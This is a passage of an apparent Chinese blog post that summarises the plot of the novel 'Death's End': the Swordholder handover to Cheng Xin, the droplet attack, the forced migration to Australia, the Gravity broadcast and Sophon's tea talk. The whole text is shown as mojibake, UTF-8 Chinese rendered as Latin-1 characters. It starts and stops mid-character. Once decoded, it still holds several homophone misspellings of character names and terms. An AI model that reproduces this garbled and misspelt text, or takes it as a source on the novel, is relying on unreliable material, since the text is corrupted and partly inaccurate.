·ï¼Œçœ‹å•¥éƒ½æ–°é²œã€‚åœ¨è¿™ä¸ªå’Œå¹³ç››ä¸–çš„å¹´ä»£ï¼Œç”·æ€§ä»¬éƒ½è¶‹äºå¥³æ€§åŒ–ï¼Œåˆ°å¤„éƒ½æ˜¯ç²¾è‡´çš„å¥³è£…å¤§ä½¬ï¼Œç¨‹å¿ƒä¸€å¼€å§‹èµ°åœ¨å¤§è¡—ä¸Šï¼Œè¿˜ä»¥ä¸ºç”·äººéƒ½ç­ç»äº†ã€‚å¥¹ä¸ç¦æ„Ÿå¹ï¼Œè¿™ä¸ªæ—¶ä»£å¤ªæ¸©æŸ”äº†ã€‚</p><p>&emsp;&emsp;ä¸€å¤©ï¼Œè¯šä¿¡æ¥åˆ°AAçš„é‚€è¯·ï¼Œå»ä¸€ä¸ªåœ°æ–¹ã€‚ç¨‹å¿ƒåˆ°äº†åå¹¶æ²¡æœ‰æ‰¾åˆ°AAï¼Œç­‰å¾…å¥¹çš„æ˜¯ä¹‹å‰è‡ªå·±çš„ä¸Šå¸ï¼Œç»´å¾·å†·é™çš„å‘ç¨‹å¿ƒè¿å¼€ä¸¤æªï¼Œç»´å¾·å‘Šè¯‰ä»–ï¼Œæˆ‘ä¸ä½ å¹¶æ²¡æœ‰ç§äººæ©æ€¨ï¼Œåªæ˜¯æˆ‘éœ€è¦æˆä¸ºæ‰§å‰‘äººï¼Œè€Œä½ ä¼šé˜»æ­¢æˆ‘ã€‚æˆ‘å¿…é¡»ä¸æ‹©æ‰‹æ®µçš„å‰è¿›ã€‚</p><p>&emsp;&emsp;ä½†AAå’Œè­¦å¯ŸåŠæ—¶èµ¶åˆ°ï¼Œå‡»æ–­äº†ç»´å¾·çš„æ‰‹è‡‚ï¼Œæ•‘äº†å·®ç‚¹æ­»æ‰çš„ç¨‹å¿ƒã€‚è¿˜å¥½AAåŠæ—¶å‘ç°äº†æœ‰äººä¼ªé€ å¥¹çš„å£°éŸ³è·Ÿç¨‹å¿ƒé€šè¯ã€‚ä¸ç„¶ï¼Œè¯šä¿¡æ­»å®šäº†ã€‚ç»´å¾·è¯´çš„æ‰§å‰‘äººæ˜¯ä»€ä¹ˆï¼Œè·Ÿç¨‹å¿ƒæœ‰ç”¨ä»€ä¹ˆå…³ç³»å‘¢ï¼Ÿåœ¨äºšæ´²ï¼ŒåŒ—ç¾ï¼Œå’Œæ¬§æ´²ï¼Œåˆ†å¸ƒç€ä¸‰ä¸ªå¼•åŠ›æ³¢å¤©çº¿ã€‚è¿˜æœ‰ä¸€ä¸ªåœ¨å¤ªç©ºä¸­çš„å¼•åŠ›æ³¢å¤©çº¿ï¼Œå°±æ˜¯ä¸‡æœ‰å¼•åŠ›å·é£èˆ¹ã€‚æ‰§å‰‘äººæŒæ¡ç€å¯åŠ¨å¼•åŠ›æ³¢å¤©çº¿ï¼Œå‘å®‡å®™å‘å°„ä¸‰ä½“æ’æ˜Ÿåæ ‡ä¿¡å·çš„æƒåˆ©ã€‚åªè¦ä¸‰ä½“äººä¸è€å®ï¼Œä¿¡å·å°±ä¼šå‘å‡ºå»ã€‚ä¸ä¹…åï¼Œä¸‰ä½“ä¸–ç•Œå’Œäººç±»ä¸–ç•Œéƒ½ä¼šé­åˆ°é»‘æš—æ£®æ—æ‰“å‡»ã€‚æ­¤æ—¶ä¸‰ä½“å’Œäººç±»è¿™ä¸¤ä¸ªä¸–ç•Œçš„æ–‡æ˜éƒ½æŒæ¡åœ¨ä¸€ä¸ªäººçš„æ‰‹é‡Œï¼Œè¿™ä¸ªäººï¼Œå°±æ˜¯é€»è¾‘ã€‚</p><p>&emsp;&emsp;æ­¤æ—¶çš„ç½—è¾‘æ˜¯ç¬¬ä¸€ä»»æ‰§å‰‘äººï¼Œåœ¨è¿™ä¸ªæ¸©æŸ”çš„å¹´ä»£ï¼Œäººä»¬æƒ§æ€•å±é™©çš„æ‰§å‰‘äººï¼Œæ¸æ¸çš„æ¸©æŸ”çš„äººä»¬å¸Œæœ›æ‰§å‰‘äººä¹Ÿæ˜¯æ¸©æŸ”çš„ã€‚äºæ˜¯æ°‘å¿ƒæ‰€å‘ï¼Œå¤§å®¶é€‰æ‹©äº†ç¨‹å¿ƒä½œä¸ºä¸‹ä¸€ä»»æ‰§å‰‘äººã€‚è¿™ä¸ªæ—¶ä»£çš„åŒ»ç–—æŠ€æœ¯å·²ç»å¾ˆå…ˆè¿›äº†ï¼Œç¨‹å¿ƒæ¢å¤å¾—å¾ˆå¿«ã€‚ä¸ä¹…åï¼Œç¨‹å¿ƒè§åˆ°äº†å·²æ˜¯ç™¾å²è€äººçš„ç½—è¾‘ï¼Œæ­¤æ—¶çš„å¥¹å·²ç»ç™½å‘è‹è‹ï¼Œååˆ†ç¨³é‡è€Œä¸”åšå®šã€‚ä»å‰çš„é‚£ä¸ªç©ä¸–ä¸æ­çš„èŠ±èŠ±å…¬å­æ¶ˆå¤±äº†ï¼Œä»–çš„å¦»å­å’Œå­©å­æ—©å·²ç¦»å¼€äº†ä»–ã€‚ç½—è¾‘åœ¨ä»–äººçœ¼é‡Œå˜å¾—è¶Šæ¥è¶Šåƒä¸€ä¸ªæ¶é­”ï¼Œæ‰§å‰‘äººçš„äº¤æ¥ä»ªå¼å¼€å§‹äº†ï¼Œç½—è¾‘æŠŠæ§åˆ¶å¼•åŠ›æ³¢å‘å°„æŒ‰é’®çš„æƒæ–ï¼Œäº¤ç»™äº†ç¨‹å¿ƒï¼Œ ç½—è¾‘é€€ä¼‘äº†ï¼Œä»–å®Œæˆäº†ä½¿å‘½ã€‚è€Œç¨‹å¿ƒä¸‡ä¸‡æ²¡æƒ³åˆ°ï¼Œå¥¹è¿™ä¸ªæ‰§å‰‘äººåªå½“äº†15åˆ†é’Ÿï¼Œå°±åœ¨äº¤æ¥å®Œåï¼Œæ½œä¼åœ¨å¤ªé˜³ç³»çš„å…­é¢—æ°´æ»´ï¼Œçªç„¶å‘åŠ¨æ”»å‡»ï¼Œç¨‹å¿ƒå¬ç€è­¦æŠ¥å£°ä¸çŸ¥æ‰€æªï¼Œå†…å¿ƒçº ç»“çš„ç¨‹å¿ƒå†³å®šæ‰”æ‰æ‰‹ä¸­çš„å‘å°„æ§åˆ¶å™¨ã€‚</p><p>&emsp;&emsp;é¡·åˆ»é—´ï¼Œåœ°çƒä¸Šä¸‰ä¸ªå¼•åŠ›æ³¢å‘å°„å¤©çº¿ï¼Œå…¨éƒ¨è¢«æ°´æ»´æ’æ¯ã€‚åœ°çƒä»æ­¤ä¸§å¤±äº†é»‘æš—æ£®æ—å¨æ…‘èƒ½åŠ›ã€‚ä¸‰ä½“äººä¸€ç›´éšè—ç€ä¸€é¡¹æœ¬é¢†æ²¡æœ‰äº¤ç»™äººç±»ï¼Œé‚£å°±æ˜¯åˆ¶é€ å…‰é€Ÿé£èˆ¹çš„æŠ€æœ¯ã€‚ä¸‰ä½“äººç°åœ¨å·²ç»é€ å‡ºäº†å…‰é€Ÿé£èˆ¹ï¼Œå››å¹´åï¼Œæ–°çš„ä¸‰ä½“èˆ°é˜Ÿå³å°†æŠµè¾¾åœ°çƒã€‚</p><p>&emsp;&emsp;ä¸‰ä½“äººæ‰“ç ´äº†ä¸¤ä¸ªæ–‡æ˜é—´è„†å¼±çš„å¹³è¡¡ï¼Œæ™ºå­ç»™äººä»¬ä¸€å¹´æœŸé™å…¨éƒ¨ç§»æ°‘æ¾³å¤§åˆ©äºšï¼Œå¦‚æœ‰ä¸ä»è€…ï¼Œæ ¼æ€å‹¿è®ºã€‚ä¸‰ä½“äººä¸æƒ³ç­ç»äººç±»ï¼Œå®Œå…¨æ˜¯å‡ºè‡ªäºå¯¹åœ°çƒæ–‡åŒ–çš„çƒ­çˆ±å’Œæ•¬æ„ã€‚</p><p>&emsp;&emsp;ä½†å¤§å¤šæ•°äººè¿˜æ²‰æµ¸åœ¨æ¸©æŸ”ä¹¡é‡Œ ï¼Œä¸è‚¯ç¦»å»ï¼Œç­‰å¾…å¥‡è¿¹å‘ç”Ÿã€‚æ™ºå­ä¸€çœ‹ï¼ŒåŸæ¥ä½ ä»¬æŠŠæˆ‘è¯´çš„è¯å½“è€³æ—é£ï¼Œäºæ˜¯æ²¡è¿‡å¤šä¹…ï¼Œæ°´æ»´å¼€å§‹åœ¨å¤§åŸå¸‚é‡Œä¹±æ’ï¼Œé«˜æ¥¼å¤§å¦é€ä¸ªå´©å¡Œï¼Œä¸€å¤©å†…æ­»äº†ä¸‰åå¤šä¸‡äººã€‚äººä»¬æ— å¥ˆä¹‹ä¸‹å¼€å§‹å¾€æ¾³å¤§åˆ©äºšè¿å¾™ã€‚</p><p>&emsp;&emsp;ä¸€å¹´åï¼Œæ¾³å¤§åˆ©äºšèšé›†äº†å››åä¸€äº¿å…­åƒä¸‡äººï¼Œæ™ºå­å’Œæ°´æ»´ä¸å¯èƒ½ç®¡ç†è¿™ä¹ˆå¤šäººï¼Œäºæ˜¯ä»–ä»¬å¼€å§‹æ‹›å‹Ÿåœ°çƒæ²»å®‰å†›ï¼Œä¸‰ä½“äººç»™çš„å¾…é‡éå¸¸ä¸°åšï¼Œæ—¢å¯è·å¾—è‡ªç”±ï¼Œåˆå¯è·å¾—æƒåŠ›ã€‚ä¸€æ—¶é—´åäº¿äººäº‰ç›¸æŠ¥åï¼Œæœ€åæœ‰äº”ç™¾ä¸‡äººé€šè¿‡ã€‚</p><p>&emsp;&emsp;è¿™å¸®æ²»å®‰å†›ï¼Œå¼€å§‹è¿˜å¾ˆæ”¶æ•›ï¼Œä½†åæ¥ï¼Œéšç€æ¾³å¤§åˆ©äºšçš„äººè¶Šæ¥è¶Šå¤šï¼Œè¿™å¸®äººæ¸æ¸å˜æˆäº†é­”é¬¼ã€‚éšç€ç§»æ°‘æœŸé™çš„åˆ°æ¥ï¼Œæ²»å®‰å†›å¼€å§‹å¤§é‡å± æ€æ²¡æœ‰ç§»æ°‘è¿›æ¾³å¤§åˆ©äºšçš„äººã€‚å¾ˆå¤šäººç»„æˆäº†æŠµæŠ—ä¸‰ä½“äººçš„ç»„ç»‡ã€‚è¿™å¸®æŠµæŠ—å†›çš„ç²¾ç¥é¢†è¢–ä¾¿æ˜¯ç½—è¾‘ã€‚ä½†ä»–ä»¬å¹¶æ‰“ä¸åˆ°ä¸‰ä½“äººï¼Œå› ä¸ºä¸‰ä½“äººè¿˜æ²¡åˆ°ã€‚ä»–ä»¬åªèƒ½æ‰“æ‰“èº«ä¸ºæ²»å®‰å†›çš„äººç±»ã€‚</p><p>&emsp;&emsp;å½“ç§»æ°‘ç»“æŸåï¼Œæ™ºå­åˆ‡æ–­äº†å¯¹æ¾³å¤§åˆ©äºšçš„ä¾›ç»™ï¼ŒåŒ…æ‹¬é£Ÿç‰©ï¼Œç”µåŠ›ç­‰ç”Ÿæ´»å¿…éœ€å“ã€‚æ™ºå­çš„å¤§æ„å°±æ˜¯å‘Šè¯‰æ¾³å¤§åˆ©äºšçš„äººä»¬ï¼Œä½ ä»¬ç°åœ¨å¼€å§‹äººåƒäººå§ã€‚ç­‰äººå£é™åˆ°ä¸‰åƒä¸‡åˆ°äº”åƒä¸‡åï¼Œæˆ‘ä»¬å†å¼€å§‹ä¾›ç»™ã€‚ç¨‹å¿ƒå’ŒAAä¹Ÿç§»æ°‘åˆ°äº†æ¾³å¤§åˆ©äºšï¼Œå¥¹æ²¡è¢«å¤±æœ›çš„äººä»¬æ‰“æ­»ï¼Œå¾—å¤šäºAAå’Œæ™ºå­çš„å…³ç…§ã€‚</p><p>&emsp;&emsp;æ™ºå­æœ¬æ¥æƒ³å¸¦ç¨‹å¿ƒç¦»å¼€æ¾³å¤§åˆ©äºšä½†è¢«ç¨‹å¿ƒæ‹’ç»äº†ï¼Œå¥¹æŠŠè¿™ä¸ªæœºä¼šç»™äº†AAã€‚ç¨‹å¿ƒå½“ç„¶çŸ¥é“ï¼Œè‡ªå·±å¯èƒ½ä¼šåœ¨è¿™è¢«äººåƒæ‰ï¼Œä½†å¿ƒç°æ„å†·çš„å¥¹ï¼Œæ—©å°±ä¸åœ¨æ„äº†ã€‚</p><p>&emsp;&emsp;å¦ä¸€è¾¹æ­£åœ¨è¿½å‡»è“è‰²ç©ºé—´å·çš„ä¸‡æœ‰å¼•åŠ›å·ï¼Œä¸‰ä½“äººä»¥ä¸ºä»–ä»¬å·²ç»è¢«è·Ÿéšçš„æ°´æ»´è§£å†³æ‰äº†ã€‚ä½†æ˜¯ï¼Œä¸‡ä¸‡æ²¡æœ‰æƒ³åˆ°ï¼Œè“è‰²ç©ºé—´å·è¿›å…¥äº†ä¸€ä¸ªæ€ç»´ç¢å—ï¼Œåœ¨è¿™ä¸ªç©ºé—´é‡Œçœ‹ä¸‰ç»´æ—¶é—´çš„ç‰©ä½“ï¼Œå°±åƒçœ‹åˆ°äº†ç»†èŠ‚ä¸°å¯Œçš„ä¸‰ç»´å±•å¼€å›¾ã€‚å¦‚æœæˆ‘åœ¨æ€ç»´ç©ºé—´é‡Œæ‹¿èµ°ä¸‰ç»´ç©ºé—´é‡Œä¸€ä¸ªäººçš„å¿ƒè„ï¼Œè¿™ä¸ªè¢«æ‹¿èµ°å¿ƒè„çš„äººï¼Œä¸ä¼šæœ‰ä¸æ¯«å¤–ä¼¤ï¼Œç®€ç›´å°±æ˜¯éš”ç©ºå–ç‰©ã€‚æ°´æ»´è™½ç„¶å¤–è¡¨åšä¸å¯æ‘§ï¼Œä½†å†…éƒ¨å´å¾ˆè„†å¼±ï¼Œäººä»¬é€šè¿‡å››ç»´ç©ºé—´ï¼Œç ´åäº†æ°´æ»´çš„å†…éƒ¨ï¼Œéšåï¼Œè“è‰²ç©ºé—´å¥½é€šè¿‡æ€ç»´ç©ºé—´è¿›å…¥äº†ä¸‡æœ‰å¼•åŠ›å·ï¼Œå¹¶æ§åˆ¶äº†è¿™è‰˜é£èˆ¹ã€‚ä¸ä¹…åï¼Œè“è‰²ç©ºé—´å·å¸æ”¶äº†å¤–æœ‰å¼•åŠ›å·ä¸Šçš„ä¸¤ç™¾å¤šä½èˆ¹å‘˜ã€‚ç»è¿‡é›†ä½“å•†è®®ï¼Œä»–ä»¬è®¤ä¸ºä¸‰ä½“äººåº”è¯¥å·²ç»å é¢†äº†åœ°çƒï¼Œæ‰“ç ´äº†å’Œå¹³åè®®ã€‚æœ€ç»ˆï¼Œå¤§å®¶å†³å®šï¼Œé€šè¿‡ä¸‡æœ‰å¼•åŠ›å·ï¼Œå‘å®‡å®™å‘å‡ºä¸‰ä½“æ’æ˜Ÿçš„åæ ‡ï¼Œè¿›è¡Œæ‰“å‡»æŠ¥å¤ã€‚è¿™ä¸¤è‰˜é£èˆ¹å±¥è¡Œå®Œäº†å¯¹äººç±»æœ€åçš„è´£ä»»ï¼Œä¾¿ç»§ç»­å‘æ˜Ÿæµ·æ·±å¤„é£˜å»ã€‚</p><p>&emsp;&emsp;ä¸‡æœ‰å¼•åŠ›å·å‘å®‡å®™å‘å‡ºä¸‰ä½“çš„æ’å¿ƒåæ ‡åï¼Œä¸‰ä½“ä¸–ç•Œçš„æ’æ˜Ÿé©¬ä¸Šå°±è¢«ä¸€é¢—å…‰ç²’ç©¿è¿‡ï¼Œè¢«å½»åº•æ¯ç­äº†ã€‚ä»æ­¤äººä»¬è¿›å…¥äº†å¹¿æ’­çºªå…ƒã€‚</p><p>&emsp;&emsp;å¤§ç§»æ°‘å®Œæˆåçš„ç¬¬å…­å¤©ï¼Œä¸‰ä½“æ’è¡Œæ˜Ÿè¢«æ‘§æ¯äº†ã€‚ä¸‰ä½“äººå½»åº•æ”¾å¼ƒäº†å é¢†åœ°çƒï¼Œå› ä¸ºä»–ä»¬çŸ¥é“ï¼Œç”±äºä¸¤ä¸ªæ–‡æ˜é—´é•¿å¹´ç´¯æœˆçš„é€šè®¯ï¼Œä¸‰ä½“æ–‡æ˜è¢«æ‰“å‡»åï¼Œå¤ªé˜³ç³»è¢«æ¯ç­ä¹Ÿåªæ˜¯æ—¶é—´é—®é¢˜ã€‚æ™ºå­æ”¾å¼ƒäº†ç§»æ°‘è®¡åˆ’ï¼Œè‹¦éš¾ç»“æŸäº†ã€‚äººä»¬å››å¤„æ¬¢å‘¼ã€‚</p><p>&emsp;&emsp;å¹¿æ’­çºªå…ƒä¸ƒå¹´ï¼ŒAAåœ¨æ¾³å¤§åˆ©äºšæ²¡ç•™å¤šä¹…ï¼Œè¿™äº›å¹´å¥¹ç¨‹å¿ƒçš„å…¬å¸æ‰“ç†çš„å¾ˆå¥½ï¼Œæˆä¸ºäº†å¤ªç©ºå»ºç­‘ä¸šçš„å·¨å¤´ã€‚é‚£äº›ä¸‰ä½“äººçš„äººç±»æ²»å®‰å†›ä»¬å¼€å§‹è¢«æ¸…ç®—ï¼Œæ— æ•°çš„æ²»å®‰å†›è¢«åˆ¤å¤„æ­»åˆ‘æˆ–ç›‘ç¦ã€‚å››å¹´åï¼Œäººä»¬åœ¨åœ°çƒä¸Šè§‚æµ‹åˆ°äº†ä¸‰ä½“æ¯æ˜Ÿçš„æ¯ç­ï¼Œå¨èƒäº†äººç±»è¿‘ä¸‰ä¸ªä¸–çºªçš„ä¸‰ä½“ä¸–ç•Œï¼Œè¢«å½»åº•æ‘§æ¯äº†ã€‚æ™ºå­åœ¨å¹¿æ’­çºªå…ƒåˆæ¶ˆå¤±äº†ï¼Œå¶å°”ä¹Ÿä¼šä½œä¸ºä¸‰ä½“ä¸–ç•Œçš„ä¼ å£°ç­’å‡ºç°ã€‚ä¸ºä»€ä¹ˆäººç±»ç°åœ¨ä¸å»å¹²æ‰æ™ºå­ï¼Œåˆ«å¿˜äº†ï¼Œæ°´æ»´è¿˜åœ¨åœ°çƒä¸Šå‘¢ã€‚</p><p>&emsp;&emsp;æœ‰ä¸€å¤©ï¼Œæ™ºå­çªç„¶è¯·ç½—è¾‘å’Œç¨‹å¿ƒå»å¥¹å®¶é‡Œå–èŒ¶ï¼Œæƒ³å’Œè¿™ä¸¤ä¸ªè€æœ‹å‹å™å™æ—§ã€‚äººä»¬åŠå…¶é‡è§†è¿™æ¬¡ä¼šè°ˆï¼Œå¸Œæœ›ä»–ä»¬èƒ½å¸¦å›ä¸€äº›æœ‰ä»·å€¼çš„ä¿¡æ¯ï¼Œå½“æ‰€æœ‰äººçŸ¥é“ä¸‰ä½“ä¸–ç•Œè¢«æ¯ç­åï¼Œæ™ºå­æ›¾ä»£è¡¨å…¨ä¸‰ä½“äººåœ¨å›½é™…ç¤¾ä¼šå‘è¡¨äº†ä¸€æ®µç®€çŸ­çš„è®²è¯ã€‚è¯è¯­é‡Œæ²¡æœ‰è°´è´£ï¼Œæ²¡æœ‰æ€¨æ¨ï¼Œæ²¡æœ‰è¯„ä»·ï¼Œåªæ˜¯ç®€å•é€šæŠ¥äº†ç¾éš¾è¿‡ç¨‹ã€‚ä¸‰ä½“æ–‡æ˜ä»æ­¤å¼€å§‹äº†æ˜Ÿèˆ°æ–‡æ˜ã€‚</p><p>&emsp;&emsp;ç½—è¾‘å’Œç¨‹å¿ƒè¿›å…¥äº†æ™ºå­çš„å®¶é‡Œã€‚éšåï¼Œå¼€å§‹äº†å…·æœ‰é‡è¦å†å²æ„ä¹‰çš„èŒ¶é“è°ˆè¯ã€‚è¿™åœºè°ˆè¯ä¸€å¼€å§‹ï¼Œç¨‹å¿ƒå°±æ€¥äºè¯¢é—®å„ç§é—®é¢˜ï¼Œæ™ºå­ç»™å‡ºçš„å›ç­”ï¼Œå¤§æ¦‚å°±æ˜¯ï¼Œå¤ªé˜³ç³»è¢«æ‘§æ¯æ˜¯è‚¯å®šçš„ï¼Œä½†éœ€è¦ä¸€æ®µæ—¶é—´ã€‚å¯èƒ½æœ‰ä¸€ä¸¤ä¸ªä¸–çºªã€‚å½“åŠ¡ä¹‹æ€¥ï¼Œå°±æ˜¯èµ¶ç´§è·‘ã€‚éšåï¼Œæ™ºå­å¸Œæœ›ä¸è¦å†è¢«æé—®ã€‚å¥¹è¯´ï¼Œæˆ‘è¯·äºŒä½ï¼Œæ˜¯æ¥å–èŒ¶é“åˆ«çš„ã€‚æ­¤æ—¶ï¼Œä¸€ç›´æ²‰é»˜çš„ç½—è¾‘å¼€å£è¯´ï¼Œæˆ‘å¯ä»¥å†é—®ä¸€ä¸ªé—®é¢˜ä¹ˆï¼Ÿæ™ºå­è¯·ç½—è¾‘ç¨ç­‰ä¸€ä¸‹ï¼Œæ²‰æ€è¿‡åå¯¹ç½—è¾‘è¯´é“ï¼Œå¯ä»¥ï¼Œè¿™æ˜¯å‡ºäºæˆ‘ä»¬ä¸‰ä½“äººå¯¹ç½—è¾‘æ‚¨çš„å°Šé‡ï¼Œä½†æˆ‘åªèƒ½å›ç­”ä½ ï¼Œæ˜¯ï¼Œä¸æ˜¯æˆ–ä¸çŸ¥é“ã€‚ç„¶åï¼Œæˆ‘ä¾¿ä¸ä¼šå†å›ç­”äºŒä½ä»»ä½•é—®é¢˜äº†ã€‚ç½—è¾‘ä¸æ¯«æ²¡æœ‰çŠ¹è±«ï¼Œé—®å‡ºäº†æœ€åä¸€ä¸ªé—®é¢˜ã€‚åœ¨å®‡å®™ä¸­å­˜ä¸å­˜åœ¨ä¸€ç§å®‰å…¨å£°æ˜ï¼Œå¯ä»¥é¿å…é»‘æš—æ£®æ—æ‰“å‡»ã€‚æ•´ä¸ªå±‹å­å¯‚é™äº†å¾ˆä¹…ï¼Œæ™ºå­ç»ˆäºå¼€å£äº†ï¼Œå¥¹è¯´ï¼Œæœ‰ã€‚</p><p>&emsp;&emsp;èŒ¶é“è°ˆè¯ç»“æŸäº†ï¼Œæ‰€æœ‰äººéƒ½åœ¨æ€è€ƒå¦‚ä½•å‘å¸ƒå®‰å…¨å£°æ˜ã€‚å®—æ•™æ€»æ˜¯åœ¨äººä»¬æ¶ˆæçš„æ—¶ä»£å…´æ—ºï¼Œåœ°çƒé€æ¸æˆä¸ºä¸€ä¸ªå¤§æ•™å ‚ï¼Œä¸€é¢—ç¥ˆç¥·ä¹‹æ˜Ÿã€‚ç”±äºä¸‰ä½“äººçŸ¥é“å¦‚ä½•å‘å¸ƒå®‰å…¨å£°æ˜ï¼Œä¸‰ä½“æˆä¸ºäº†äººä»¬å¿ƒä¸­çš„ç¥ï¼Œæ™ºå­æˆä¸ºäº†è¢«ç¥ˆç¥·çš„å¯¹è±¡ã€‚æ™ºå­çš„å®¶é—¨å£ï¼Œæ¯æ—¥éƒ½æœ‰æˆåƒä¸Šä¸‡çš„äººåœ¨æ­¤ç¥ˆç¥·ï¼Œä½†æ™ºå­æ¯æ¬¡ä¹Ÿåªæ˜¯å‘ä¼—äººå¾®å¾®é èº¬ï¼Œç„¶åæ‚„ç„¶é€€å»ã€‚æ™ºå­è¦ç¦»å¼€çš„é‚£ä¸€å¤©åˆ°äº†ï¼Œå®ƒä¼šç¦»å¼€è¿™ä¸ªç¾ä¸½çš„èº¯å£³ï¼Œé£å¾€ä¸‰ä½“èˆ°é˜Ÿã€‚å¥¹æœ€åä¸€æ¬¡ä¼šè§äº†ç½—è¾‘å’Œç¨‹å¿ƒï¼Œè¿™æ¬¡ï¼Œä¸‰ä¸ªäººæ²¡è¯´ä»€ä¹ˆè¯ï¼Œå› ä¸ºä»–ä»¬éƒ½çŸ¥é“ï¼Œè¯¥è¯´çš„éƒ½è¯´å®Œäº†ã€‚æ™ºå­æ‰“ç ´äº†å¯‚é™ï¼Œå¥¹è¯´ï¼Œæˆ‘è¦èµ°äº†ï¼Œè¯·äºŒä½å¤šå¤šä¿é‡ã€‚å®‡å®™å¾ˆå¤§ï¼Œç”Ÿæ´»æ›´å¤§ï¼Œä¹Ÿè®¸ä»¥åè¿˜æœ‰ç¼˜å†è§ã€‚è¿˜æœ‰ï¼Œç¨‹å¿ƒï¼Œäº‘å¤©æ˜è¦è§ä½ ã€‚</p><p>&emsp;&emsp;ä¸‰ä½“æ–‡æ˜æ¯”åœ°çƒæ–‡æ˜å¼ºå¤§å¤ªå¤šäº†ï¼Œäººç±»åœ¨ä¸‰ä½“äººçœ¼é‡Œå°±æ˜¯è™«å­ï¼Œä¸‰ä½“äººé¢å¯¹è™«å­çš„å¨èƒï¼Œè¡¨ç°å‡ºæ¥çš„ä¸æ˜¯æ†‹å±ˆï¼Œä¸æ˜¯ä¸æƒ…æ„¿ï¼Œè€Œæ˜¯éå¸¸çœŸè¯šï¼Œä½†åˆä¸åœåœ°ç¾¤é’Šæ‰“ç ´è¿™ç§å¹³è¡¡çš„å¯èƒ½ï¼Œè¿™æ‹›ç”¨çš„å¥½å‰å®³ã€‚å·®ç‚¹å°±æŠŠäººç±»ç»™æå®šäº†ã€‚çœ‹æ¥ä¸æ‡‚è®¡è°‹çš„ä¸‰ä½“äººï¼Œè·Ÿäººç±»æ‰“äº¤é“çš„è¿™300å¤šå¹´é‡Œï¼Œè·Ÿç€å­¦ä¼šäº†ä¸å°‘é˜´æ‹›ã€‚ä¸¤ä¸ªæ–‡æ˜çš„å¹³è¡¡ï¼Œå°±æ¡åœ¨æ‰§å‰‘äººæ‰‹é‡Œï¼Œä¸€ä¸ªåˆæ ¼çš„æ‰§å‰‘äººæ‰èƒ½ä¿æŒè¿™ç§å¹³è¡¡ã€‚å¯æƒœï¼Œæƒ³ç”¨çˆ±æ‹¯æ•‘ä¸–ç•Œçš„ç¨‹å¿ƒä¸æ˜¯è¿™ä¸ªäººï¼Œåœ¨ä¸‰ä½“çš„æ¯æ˜Ÿè¢«æ‘§æ¯åï¼Œä¸‰ä½“äººé¢å¯¹è‡ªå·±çš„å®¿æ•Œï¼Œè¡¨ç°å‡ºäº†å¾—ä½“ã€ç¤¼è²Œå’Œæˆç†Ÿï¼Œæ²¡æœ‰ä¸æ¯«æ€¨æ¨ï¼Œä¹Ÿæ²¡æœ‰è°ˆè®ºæ˜¯éï¼Œä»…ç”¨å¹³æ·¡çš„èŒ¶ä¼šç»“æŸäº†300å¤šå¹´çš„å¯¹å†³ã€‚</p><h3 id="æ­»ç¥æ°¸ç”Ÿ-ä¸‹"><a href="#æ­»ç¥æ°¸ç”Ÿ-ä¸‹" class="headerlink" title="æ­»ç¥æ°¸ç”Ÿ ä¸‹"></a>æ­»ç¥æ°¸ç”Ÿ ä¸‹</h3><p>&emsp;&emsp;æ™ºå­å¯¹ç¨‹å¿ƒè¯´ï¼Œäº‘å¤©æ˜è¦è§ä½ ï¼Œè¿™å¥è¯ä»ä½•è¯´èµ·ã€‚åŸæ¥ï¼Œå½“åˆä¸‰ä½“äººä¸€ç›´å…³æ³¨ç€é˜¶æ¢¯è®¡åˆ’ï¼Œå½“ç¬¬ä¸€æ‰¹ä¸‰ä½“èˆ°é˜Ÿï¼Œå› ä¸ºç½—è¾‘çš„å¨èƒè¢«è¿«ç¦»å¼€å¤ªé˜³ç³»åï¼Œä»–ä»¬å†³å®šï¼Œå»æ‰¾è£…æœ‰äº‘å¤©æ˜å¤§è„‘çš„æ¢æµ‹å™¨ä½œä¸ºçºªå¿µå“ã€‚</p><p>&emsp;&emsp;ä»äº‘å¤©æ˜èƒ½è§ç¨‹å¿ƒæ¥çœ‹ï¼Œäº‘å¤©æ˜åœ¨ä¸‰ä½“é£èˆ¹é‚£é‡Œæ··å¾—è¿˜ç®—ä¸é”™ã€‚ä¸‰ä½“äººä¸¥æ­£å£°æ˜ï¼Œè¿™åªæ˜¯äº‘å¤©æ˜å’Œç¨‹å¿ƒä¸¤ä¸ªäººä¹‹é—´çš„äº‹ï¼ŒåŒæ–¹ä¸èƒ½æåŠä¸‰ä½“æ–‡æ˜ï¼Œä¼šé¢ä¸å¾—æœ‰ç¬¬ä¸‰æ–¹åœ¨åœºï¼Œä¹Ÿä¸èƒ½ä»¥ä»»ä½•å½¢å¼è®°å½•ï¼Œä¸ºäº†ä¿è¯éš”ç¦»æ€§ï¼Œè¿™æ¬¡ä¼šé¢è®¾ç«‹åœ¨å¤ªç©ºä¸­ã€‚ç¨‹å¿ƒä¹˜åé£èˆ¹é£åˆ°æŒ‡å®šåœ°ç‚¹åï¼Œæ™ºå­å°†ç®€å†è¿œç¨‹çš„å®æ—¶è§†é¢‘é€šè®¯ã€‚å¦‚æœä¸‰ä½“äººå‘ç°ï¼Œè°ˆè¯ä¸­è®¾è®¡ä¸å…è®¸æåŠçš„å†…å®¹ï¼Œé‚£ä¹ˆï¼Œç¨‹å¿ƒå¾—é£è¡Œå™¨å°†ä¼šçˆ†ç‚¸ã€‚</p><p>&emsp;&emsp;é€šè®¯å¼€å§‹äº†ï¼Œç¨‹å¿ƒçœ‹åˆ°äº†äº‘å¤©æ˜ï¼Œä»–çš„èº«ä½“è¢«ä¸‰ä½“äººå¤åŸäº†ï¼Œäº‘å¤©æ˜çœ‹èµ·æ¥å¾ˆå¥åº·ï¼Œå¾ˆå¹´è½»ã€‚äº‘å¤©æ˜å‘Šè¯‰ç¨‹å¿ƒï¼Œä»–åœ¨ä¸‰ä½“é£èˆ¹ä¸Šå¹³æ—¶é™¤äº†ç§åœ°æ¶ˆé£ï¼Œå°±æ˜¯ç»™ä¸‰ä½“äººçš„å­©å­ä»¬è®²æ•…äº‹ã€‚è¿™é‡Œé¡ºå¸¦ä¸€æï¼Œç”±äºä¸‰ä½“æ–‡æ˜æ–‡åŒ–çš„åŒ®ä¹ï¼Œæ‰€ä»¥ä¸‰ä½“äººç‰¹åˆ«å–œæ¬¢æŒºäº‘å¤©æ˜è®²æ•…äº‹ã€‚äº‘å¤©æ˜è¿˜åœ¨é‚£å‡ºäº†ä¹¦ï¼Œæˆä¸ºäº†ä¸‰ä½“ä¸–ç•ŒçŸ¥åçš„æ–‡å­¦å®¶ã€‚ç”±äºä¸‰ä½“äººå·²çŸ